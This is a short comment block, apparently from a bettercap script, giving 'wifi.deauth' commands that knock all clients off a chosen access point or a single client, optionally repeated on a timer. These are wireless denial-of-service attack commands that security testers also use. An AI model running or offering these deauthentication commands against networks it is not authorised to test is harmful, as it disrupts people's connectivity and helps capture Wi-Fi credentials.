# now just deauth clients and wait ^_^
#
# Example:
#
# wifi.deauth AP-BSSID-HERE
#
# This will deauth every client for this specific access point,
# you can put it as ticker.commands to have the ticker module
# periodically deauth clients, or:
#
# wifi.deauth CLIENT-BSSID-HERE
#
# This will only deauth a signle client from its access point.
#
# For more options `help wifi.recon`.
